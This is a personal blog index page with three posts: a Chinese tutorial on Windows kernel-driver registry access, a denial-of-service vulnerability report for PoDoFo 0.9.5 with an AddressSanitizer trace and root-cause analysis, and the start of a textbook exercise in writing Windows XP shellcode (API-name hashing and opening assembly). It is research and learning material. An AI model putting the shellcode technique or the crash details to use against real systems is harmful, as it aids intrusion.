<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>qwertwwwe</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="qwertwwwe">
<meta property="og:url" content="http://qwertwwwe.github.io/index.html">
<meta property="og:site_name" content="qwertwwwe">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="qwertwwwe">
  
    <link rel="alternate" href="/atom.xml" title="qwertwwwe" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">qwertwwwe</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://qwertwwwe.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-windows-read-registers" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/06/07/windows-read-registers/" class="article-date">
  <time datetime="2017-06-07T15:13:27.000Z" itemprop="datePublished">2017-06-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/06/07/windows-read-registers/">windows read registers</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="windows内核中注册表的打开、读-写操作"><a href="#windows内核中注册表的打开、读-写操作" class="headerlink" title="windows内核中注册表的打开、读/写操作"></a>windows内核中注册表的打开、读/写操作</h1><p>参考链接：<a href="http://www.blogfshare.com/kernel-registerrw.html" target="_blank" rel="external">http://www.blogfshare.com/kernel-registerrw.html</a></p>
<p>最近在写windows驱动时需要读取注册表的值，一下内容为windows内核中注册表操作；</p>
<h2 id="1-注册表打开"><a href="#1-注册表打开" class="headerlink" title="1.注册表打开"></a>1.注册表打开</h2><p>windows系统的注册表是一个树状结构表，每一个表中是<k,v>键值对，查找时先打开相应的表（子键），然后查询表中的<k, v="">值；<br>和应用程序编程的一点重大不同是这个路径的写法不一样。一般应用编程中需要提供一个根子键的句柄。而驱动中则全部用路径表示。相应的有一张表表示如下：</k,></k,v></p>
<table>
<thead>
<tr>
<th>应用程序中对应的子健</th>
<th style="text-align:center">驱动编程中的路径写法</th>
</tr>
</thead>
<tbody>
<tr>
<td>HKEY_LOCAL_MACHINE</td>
<td style="text-align:center">\Registry\Machine</td>
</tr>
<tr>
<td>HKEY_USERS</td>
<td style="text-align:center">\Registry\User</td>
</tr>
<tr>
<td>HKEY_CLASSES_ROOT</td>
<td style="text-align:center">没有对应的路径</td>
</tr>
<tr>
<td>HKEY_CURRENT_USER</td>
<td style="text-align:center">没有简单的对应路径，但是可以求得</td>
</tr>
</tbody>
</table>
<p>实际上应用程序和驱动程序很大的一个不同在于应用程序总是由某个“当前用户”启动的。因此可以直接读取HKEY_CLASSES_ROOT和HKEY_CURRENT_USER。而驱动程序和用户无关，所以直接去打开HKEY_CURRENT_USER也就不符合逻辑了。</p>
<p>打开注册表键使用函数ZwOpenKey。新建或者打开则使用ZwCreateKey。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function">NTSTATUS <span class="title">ZwOpenKey</span><span class="params">(</span></span></div><div class="line">  _Out_  PHANDLE KeyHandle,</div><div class="line">  _In_   ACCESS_MASK DesiredAccess,</div><div class="line">  _In_   POBJECT_ATTRIBUTES ObjectAttributes,</div><div class="line">);</div></pre></td></tr></table></figure>
<p>DesiredAccess支持一系列的组合权限。可以是下表中所有权限的任何组合：<br>KEY_QUERY_VALUE：读取键下的值。<br>KEY_SET_VALUE：设置键下的值。<br>KEY_CREATE_SUB_KEY：生成子键。<br>KEY_ENUMERATE_SUB_KEYS：枚举子键。<br>不过实际上可以用KEY_READ来做为通用的读权限组合。这是一个组合宏。此外对应的有KEY_WRITE。如果需要获得全部的权限，可以使用KEY_ALL_ACCESS。</p>
<p>下面是一个例子。它读取注册表中保存的Machine GUID值。</p>
<p>Machine GUID是一台计算机的标识符，这一值保存在注册表中，路径是“\Registry\Machine\SOFTWARE\Microsoft\Cryptography”。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">NTSTATUS status = STATUS_SUCCESS;</div><div class="line">HANDLE my_key_handle = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line"><span class="comment">// 定义要获取的路径</span></div><div class="line">UNICODE_STRING machine_guid_path =</div><div class="line">    RTL_CONSTANT_STRING(</div><div class="line">    L”\\Registry\\Machine\\SOFTWARE\\Microsoft\\Cryptography”);</div><div class="line">OBJECT_ATTRIBUTE my_obj_attr = &#123; <span class="number">0</span> &#125;;</div><div class="line"></div><div class="line"><span class="comment">// 初始化OBJECT_ATTRIBUTE</span></div><div class="line">InitializeObjectAttributes(</div><div class="line">        &amp;my_obj_attr,</div><div class="line">        &amp;machine_guid_path,</div><div class="line">        OBJ_CASE_INSENSITIVE,</div><div class="line">        <span class="literal">NULL</span>,</div><div class="line">        <span class="literal">NULL</span>);</div><div class="line"><span class="comment">// 接下来是打开Key</span></div><div class="line">status = ZwOpenKey(&amp;my_key_handle,KEY_READ,&amp;my_obj_attr);</div><div class="line"><span class="keyword">if</span>(!NT_SUCCESS(status))</div><div class="line">&#123;</div><div class="line">    <span class="comment">// 失败处理</span></div><div class="line">    ……</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="2-注册表读"><a href="#2-注册表读" class="headerlink" title="2.注册表读"></a>2.注册表读</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function">NTSTATUS <span class="title">ZwQueryValueKey</span><span class="params">(</span></span></div><div class="line">  _In_       HANDLE KeyHandle,</div><div class="line">  _In_       PUNICODE_STRING ValueName,</div><div class="line">  _In_       KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,</div><div class="line">  _Out_opt_  PVOID KeyValueInformation,</div><div class="line">  _In_       ULONG Length,</div><div class="line">  _Out_      PULONG ResultLength</div><div class="line">);</div></pre></td></tr></table></figure>
<p>KeyHandle：这是用ZwCreateKey或者ZwOpenKey所打开的一个注册表键句柄。<br>ValueName：要读取的值的名字。<br>KeyValueInformationClass：本次查询所需要查询的信息类型。这有如下的三种可能。<br>①KeyValueBasicInformation：获得基础信息，包含值名和类型。<br>②KeyValueFullInformation：获得完整信息。包含值名、类型和值的数据。<br>③KeyValuePartialInformation：获得局部信息。包含类型和值数据。</p>
<p>当采用KeyValuePartialInformation的时候，一个类型为KEY_VALUE_PARTIAL_INFORMATION的结构将被返回到参数KeyValueInformation所指向的内存中。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> _KEY_VALUE_PARTIAL_INFORMATION &#123;</div><div class="line">  ULONG TitleIndex;</div><div class="line">  ULONG Type;</div><div class="line">  ULONG DataLength;</div><div class="line">  UCHAR Data[<span class="number">1</span>];</div><div class="line">&#125; KEY_VALUE_PARTIAL_INFORMATION, *PKEY_VALUE_PARTIAL_INFORMATION;</div></pre></td></tr></table></figure>
<p>上面的数据类型Type有很多种可能：</p>
<p>①REG_BINARY：十六进制数据。<br>②REG_DWORD：四字节整数。<br>③REG_SZ：以空结束的Unicode字符串。</p>
<p>Length：用户传入的输出空间KeyValueInformation的长度。<br>ResultLength：返回实际需要的长度。<br>返回值：如果说实际需要的长度比Length要大，那么返回STATUS_BUFFER_OVERFLOW或者是STATUS_BUFFER_TOO_SMALL。如果成功读出了全部数据，那么返回STATUS_SUCCESS。其他的情况，返回一个错误码。</p>
<p>我们再来完成上面的程序：(<font color="red">先获取长度，然后不足时再动态分配内存进行读取</font>)</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">// 要读取的值的名字</div><div class="line">UNICODE_STRING machine_guid_key_name = RTL_CONSTANT_STRING(L”MachineGuid”);</div><div class="line">// 用来试探大小的key_infor</div><div class="line">KEY_VALUE_PARTIAL_INFORMATION key_infor;</div><div class="line">// 最后实际用到的key_infor指针。内存分配在堆中</div><div class="line">PKEY_VALUE_PARTIAL_INFORMATION ac_key_infor;</div><div class="line">ULONG ac_length;</div><div class="line"></div><div class="line">// 用于最后存储为char类型的变量</div><div class="line">char machine_guid[100] = "init";</div><div class="line">ULONG valueSize;</div><div class="line">……</div><div class="line"></div><div class="line">// 前面已经打开了句柄my_key，下面如此来读取值：</div><div class="line">status = ZwQueryValueKey(my_key_handle, &amp;machine_guid_key_name, KeyValuePartialInformation,</div><div class="line">							&amp;key_infor, sizeof(KEY_VALUE_PARTIAL_INFORMATION), &amp;ac_length);</div><div class="line">if(!NT_SUCCESS(status) &amp;&amp; status != STATUS_BUFFER_OVERFLOW &amp;&amp; status != STATUS_BUFFER_TOO_SMALL)</div><div class="line">&#123;</div><div class="line">    // 错误处理</div><div class="line">    …</div><div class="line">&#125;</div><div class="line"></div><div class="line">// 如果没失败，那么分配足够的空间，再次读取</div><div class="line">ac_key_infor = (PKEY_VALUE_PARTIAL_INFORMATION)</div><div class="line">ExAllocatePoolWithTag(NonpagedPool,ac_length ,'tag1');</div><div class="line">if(ac_key_infor == NULL)</div><div class="line">&#123;</div><div class="line">    stauts = STATUS_INSUFFICIENT_RESOURCES;</div><div class="line">    // 错误处理</div><div class="line">    …</div><div class="line">&#125;</div><div class="line"></div><div class="line">status = ZwQueryValueKey(my_key_handle, &amp;machine_guid_key_name, </div><div class="line">                        KeyValuePartialInformation,</div><div class="line">                        ac_key_infor, ac_length, &amp;ac_length);</div><div class="line">// 到此为止，如果status为STATUS_SUCCESS,则要读取的数据已经</div><div class="line">// 在ac_key_infor-&gt;Data中，其中存储的是UNICODE，长度存储</div><div class="line">// 在ac_key_infor-&gt; DataLength中。</div><div class="line"></div><div class="line">// 由于我需要的是char类型的，所以将其转换成char字符串</div><div class="line">ac_key_infor-&gt;Data[ac_key_infor-&gt;DataLength / sizeof(ac_key_infor-&gt;Data[0])] = UNICODE_NULL;</div><div class="line">status = RtlUnicodeToMultiByteN(machine_guid, sizeof(machine_guid) - 1, &amp;valueSize, </div><div class="line">					ac_key_infor-&gt;Data, ac_key_infor-&gt;DataLength);</div><div class="line">if (!NT_SUCCESS(status)) &#123;</div><div class="line">    // 错误处理</div><div class="line">    ...</div><div class="line">&#125;</div><div class="line">machine_guid[valueSize] = '\0';</div></pre></td></tr></table></figure>
<h2 id="3-注册表的写"><a href="#3-注册表的写" class="headerlink" title="3.注册表的写"></a>3.注册表的写</h2><p>（暂时没这个需求，没测）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function">NTSTATUS <span class="title">ZwSetValueKey</span><span class="params">(</span></span></div><div class="line">  _In_      HANDLE KeyHandle,</div><div class="line">  _In_      PUNICODE_STRING ValueName,</div><div class="line">  _In_opt_  ULONG TitleIndex,</div><div class="line">  _In_      ULONG Type,</div><div class="line">  _In_opt_  PVOID Data,</div><div class="line">  _In_      ULONG DataSize</div><div class="line">);</div></pre></td></tr></table></figure>
<p>TileIndex参数请始终填入0。KeyHandle、ValueName、Type这三个参数和ZwQueryValueKey中对应的参数相同。不同的是Data和DataSize。Data是要写入的数据的开始地址，而DataSize是要写入的数据的长度。</p>
<p>如果该Value已经存在，那么其值会被这次写入覆盖。如果不存在，则会新建一个。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">UNICODE_STRING name = RTL_CONSTANT_STRING(L”Test”);</div><div class="line">PWCHAR value = &#123; L”My Test Value” &#125;;</div><div class="line">…</div><div class="line"><span class="comment">// 写入数据。数据长度之所以要将字符串长度加上1，是为了把最后一个空结束符写入。</span></div><div class="line">status = ZwSetValueKey(my_key_handle,</div><div class="line">&amp;name,<span class="number">0</span>,REG_SZ,value,(wcslen(value)+<span class="number">1</span>)*<span class="keyword">sizeof</span>(WCHAR));</div><div class="line"><span class="keyword">if</span>(!NT_SUCCESS(status))</div><div class="line">&#123;</div><div class="line"><span class="comment">// 错误处理</span></div><div class="line">……</div><div class="line">&#125;</div></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://qwertwwwe.github.io/2017/06/07/windows-read-registers/" data-id="cj3n8j3ml0002e3nh04l4mpq0" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-PoDoFo-0-9-5-allows-remote-attackers-to-cause-a-denial-of-service-infinit-loop" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/04/22/PoDoFo-0-9-5-allows-remote-attackers-to-cause-a-denial-of-service-infinit-loop/" class="article-date">
  <time datetime="2017-04-22T05:37:13.000Z" itemprop="datePublished">2017-04-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/04/22/PoDoFo-0-9-5-allows-remote-attackers-to-cause-a-denial-of-service-infinit-loop/">PoDoFo 0.9.5 allows remote attackers to cause a denial of service(infinite loop)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>date: 2017-04-22 13:37:13</p>
<p>PoDoFo 0.9.5 funciton PdfPagesTree::GetPageNodeFromArray in PdfPagesTree.cpp cause a denial of service.</p>
<h3 id="Analyzer"><a href="#Analyzer" class="headerlink" title="Analyzer"></a>Analyzer</h3><p>code from <a href="https://sourceforge.net/p/podofo/code/HEAD/tree/podofo/trunk/" target="_blank" rel="external">https://sourceforge.net/p/podofo/code/HEAD/tree/podofo/trunk/</a> (2017-04-09)</p>
<p>compile:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cmake -G <span class="string">"Unix Makefiles"</span> -DCMAKE_INSTALL_PREFIX=/home/icepng/aaaa/ -DCMAKE_BUILD_TYPE=DEBUG -DCMAKE_EXE_LINKER_FLAGS=<span class="string">"-fsanitize=address -fno-omit-frame-pointer"</span> ../</div><div class="line">make -j</div></pre></td></tr></table></figure>
<p>and run it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./podofo-code/podofo/trunk/build/tools/podofotxtextract/podofotxtextract ./PoC</div></pre></td></tr></table></figure>
<h3 id="Crash-Info"><a href="#Crash-Info" class="headerlink" title="Crash Info"></a>Crash Info</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">==22649==ERROR: AddressSanitizer: stack-overflow on address 0x7ffced665ff8 (pc 0x7f648bc08749 bp 0x7ffced666870 sp 0x7ffced666000 T0)</div><div class="line">    <span class="comment">#0 0x7f648bc08748 in memcmp (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x77748)</span></div><div class="line">    <span class="comment">#1 0x7f648a73c277 in std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::compare(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;) const (/usr/lib/x86_64-linux-gnu/libstdc++.so.6+0x121277)</span></div><div class="line">    <span class="comment">#2 0x4d53a4 in bool std::operator&lt; &lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;) /usr/include/c++/5/bits/basic_string.h:4989</span></div><div class="line">    <span class="comment">#3 0x4f3042 in PoDoFo::PdfName::operator&lt;(PoDoFo::PdfName const&amp;) const /home/rg/Documents/podofo2/podofo/src/base/PdfName.h:252</span></div><div class="line">    <span class="comment">#4 0x52bfca in std::less&lt;PoDoFo::PdfName&gt;::operator()(PoDoFo::PdfName const&amp;, PoDoFo::PdfName const&amp;) const /usr/include/c++/5/bits/stl_function.h:387</span></div><div class="line">    <span class="comment">#5 0x52c8a3 in std::_Rb_tree&lt;PoDoFo::PdfName, std::pair&lt;PoDoFo::PdfName const, PoDoFo::PdfObject*&gt;, std::_Select1st&lt;std::pair&lt;PoDoFo::PdfName const, PoDoFo::PdfObject*&gt; &gt;, std::less&lt;PoDoFo::PdfName&gt;, std::allocator&lt;std::pair&lt;PoDoFo::PdfName const, PoDoFo::PdfObject*&gt; &gt; &gt;::_M_lower_bound(std::_Rb_tree_node&lt;std::pair&lt;PoDoFo::PdfName const, PoDoFo::PdfObject*&gt; &gt; const*, std::_Rb_tree_node&lt;std::pair&lt;PoDoFo::PdfName const, PoDoFo::PdfObject*&gt; &gt; const*, PoDoFo::PdfName const&amp;) const /usr/include/c++/5/bits/stl_tree.h:1644</span></div><div class="line">    <span class="comment">#6 0x52c297 in std::_Rb_tree&lt;PoDoFo::PdfName, std::pair&lt;PoDoFo::PdfName const, PoDoFo::PdfObject*&gt;, std::_Select1st&lt;std::pair&lt;PoDoFo::PdfName const, PoDoFo::PdfObject*&gt; &gt;, std::less&lt;PoDoFo::PdfName&gt;, std::allocator&lt;std::pair&lt;PoDoFo::PdfName const, PoDoFo::PdfObject*&gt; &gt; &gt;::find(PoDoFo::PdfName const&amp;) const /usr/include/c++/5/bits/stl_tree.h:2308</span></div><div class="line">    <span class="comment">#7 0x52be86 in std::map&lt;PoDoFo::PdfName, PoDoFo::PdfObject*, std::less&lt;PoDoFo::PdfName&gt;, std::allocator&lt;std::pair&lt;PoDoFo::PdfName const, PoDoFo::PdfObject*&gt; &gt; &gt;::find(PoDoFo::PdfName const&amp;) const /usr/include/c++/5/bits/stl_map.h:871</span></div><div class="line">    <span class="comment">#8 0x52b55a in PoDoFo::PdfDictionary::HasKey(PoDoFo::PdfName const&amp;) const /home/rg/Documents/podofo2/podofo/src/base/PdfDictionary.cpp:240</span></div><div class="line">    <span class="comment">#9 0x52b23b in PoDoFo::PdfDictionary::GetKey(PoDoFo::PdfName const&amp;) const /home/rg/Documents/podofo2/podofo/src/base/PdfDictionary.cpp:162</span></div><div class="line">    <span class="comment">#10 0x52b490 in PoDoFo::PdfDictionary::GetKeyAsName(PoDoFo::PdfName const&amp;) const /home/rg/Documents/podofo2/podofo/src/base/PdfDictionary.cpp:224</span></div><div class="line">    <span class="comment">#11 0x518211 in PoDoFo::PdfPagesTree::IsTypePage(PoDoFo::PdfObject const*) const /home/rg/Documents/podofo2/podofo/src/doc/PdfPagesTree.cpp:521</span></div><div class="line">    <span class="comment">#12 0x517fa6 in PoDoFo::PdfPagesTree::GetPageNodeFromArray(int, PoDoFo::PdfArray const&amp;, std::deque&lt;PoDoFo::PdfObject*, std::allocator&lt;PoDoFo::PdfObject*&gt; &gt;&amp;) /home/rg/Documents/podofo2/podofo/src/doc/PdfPagesTree.cpp:494</span></div><div class="line">    <span class="comment">#13 0x517e92 in PoDoFo::PdfPagesTree::GetPageNodeFromArray(int, PoDoFo::PdfArray const&amp;, std::deque&lt;PoDoFo::PdfObject*, std::allocator&lt;PoDoFo::PdfObject*&gt; &gt;&amp;) /home/rg/Documents/podofo2/podofo/src/doc/PdfPagesTree.cpp:481</span></div><div class="line">    ...</div><div class="line"><span class="comment">#250 0x517e92 in PoDoFo::PdfPagesTree::GetPageNodeFromArray(int, PoDoFo::PdfArray const&amp;, std::deque&lt;PoDoFo::PdfObject*, std::allocator&lt;PoDoFo::PdfObject*&gt; &gt;&amp;) /home/rg/Documents/podofo2/podofo/src/doc/PdfPagesTree.cpp:481</span></div><div class="line">    <span class="comment">#251 0x517e92 in PoDoFo::PdfPagesTree::GetPageNodeFromArray(int, PoDoFo::PdfArray const&amp;, std::deque&lt;PoDoFo::PdfObject*, std::allocator&lt;PoDoFo::PdfObject*&gt; &gt;&amp;) /home/rg/Documents/podofo2/podofo/src/doc/PdfPagesTree.cpp:481</span></div></pre></td></tr></table></figure>
<h3 id="analysis"><a href="#analysis" class="headerlink" title="analysis"></a>analysis</h3><p>in src/doc/PdfPagesTree.cpp:475</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"> PdfVariant rVar = rKidsArray[nPageNum]; <span class="keyword">while</span>( <span class="literal">true</span> )  &#123;     <span class="keyword">if</span>( rVar.IsArray() )      &#123;         <span class="comment">// Fixes some broken PDFs who have trees with 1 element kids arrays</span>         <span class="keyword">return</span> GetPageNodeFromArray( <span class="number">0</span>, rVar.GetArray(), rLstParents );  <span class="comment">//rg =&gt; </span>     &#125;          ...</div><div class="line">          <span class="comment">// it's a /Pages with a single kid, so dereference and try again...</span>     <span class="keyword">if</span> (<span class="keyword">this</span>-&gt;IsTypePages(pgObject) )      &#123;         <span class="keyword">if</span>( !pgObject-&gt;GetDictionary().HasKey( <span class="string">"Kids"</span> ) )             <span class="keyword">return</span> <span class="literal">NULL</span>;         rLstParents.push_back( pgObject );         rVar = *(pgObject-&gt;GetDictionary().GetKey( <span class="string">"Kids"</span> ));     &#125; <span class="keyword">else</span> &#123;<span class="comment">// Reference to unexpected object</span>PODOFO_RAISE_ERROR_INFO( ePdfError_PageNotFound, <span class="string">"Reference to unexpected object."</span> ); &#125; &#125;</div></pre></td></tr></table></figure>
<p>When use podofotxtextract to extract txt info from a PDF file,  and when the argument rKidsArray is a cycle linked list, this function will in an endless loop. When rKidsArray[0].GetReference()-&gt;GetDictionary().GetKey(“Kids”) is an array which the first element is the argument rKidsArray itselt,  in line 506 the var = rKidsArray[0].GetReference()-&gt;GetDictionary().GetKey(“Kids”) and in the next while loop, it will enter line 481, which will recursion call GetPageNodeFromArray.  Then each 2 times call GetPageNodeFromArray it will goto the same state.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://qwertwwwe.github.io/2017/04/22/PoDoFo-0-9-5-allows-remote-attackers-to-cause-a-denial-of-service-infinit-loop/" data-id="cj3n8j3md0000e3nhsrsoakpd" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-general-shellcode" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/01/18/general-shellcode/" class="article-date">
  <time datetime="2017-01-18T12:01:52.000Z" itemprop="datePublished">2017-01-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/01/18/general-shellcode/">General shellcode</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="windows-xp上的通用shellcode"><a href="#windows-xp上的通用shellcode" class="headerlink" title="windows xp上的通用shellcode"></a>windows xp上的通用shellcode</h1><p>0day书上3.4节的通用shellcode开发实验：</p>
<h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>windows xp sp3<br>visual C++ 6.0</p>
<h2 id="shellcode适用环境"><a href="#shellcode适用环境" class="headerlink" title="shellcode适用环境"></a>shellcode适用环境</h2><p>windows xp sp3及之前版本，windows 7稍微改动亦可</p>
<h3 id="1-获取3个函数名hash后的值"><a href="#1-获取3个函数名hash后的值" class="headerlink" title="1.获取3个函数名hash后的值"></a>1.获取3个函数名hash后的值</h3><p>通过将字符串进行hash计算，得到一个更短的字符串，从而简化shellcode中字符串对比的代码。<br>hash函数的C代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function">DWORD <span class="title">GetHash</span><span class="params">(<span class="keyword">char</span> *fun_name)</span></span></div><div class="line">&#123;</div><div class="line">    DWORD digest = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span>(*fun_name)</div><div class="line">    &#123;</div><div class="line">        digest = ((digest &lt;&lt; <span class="number">25</span>) | (digest &gt;&gt; <span class="number">7</span>));</div><div class="line">        digest += *fun_name;</div><div class="line">        fun_name++;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> digest;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">f_hash_print</span><span class="params">(<span class="keyword">char</span> *str)</span></span></div><div class="line">&#123;</div><div class="line">    DWORD hash = GetHash(str);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s hash is : 0x%.8x\n"</span>, str, hash);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    f_hash_print(<span class="string">"MessageBoxA"</span>);</div><div class="line">    f_hash_print(<span class="string">"ExitProcess"</span>);</div><div class="line">    f_hash_print(<span class="string">"LoadLibraryA"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>得到hash值为：<br>MessageBoxA : 0x1e380a6a<br>ExitProcess : 0x4fd18963<br>LoadLibraryA : 0x0c917432 </p>
<h3 id="2-编写shellcode"><a href="#2-编写shellcode" class="headerlink" title="2.编写shellcode"></a>2.编写shellcode</h3><p>首先将3个函数的hash值压入栈 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">CLD                 ;clear flag DF</div><div class="line">;store hash</div><div class="line">push 0x1e380a6a     ;hash of MessageBoxA</div><div class="line">push 0x4fd18963     ;hash of ExitProcess</div><div class="line">push 0x0c917432     ;hash of LoadLibraryA</div><div class="line">mov esi, esp        ;esi = addr of first function hash[LoadLibraryA]</div><div class="line">lea edi, [esi - 0xc]</div></pre></td></tr></table></figure>
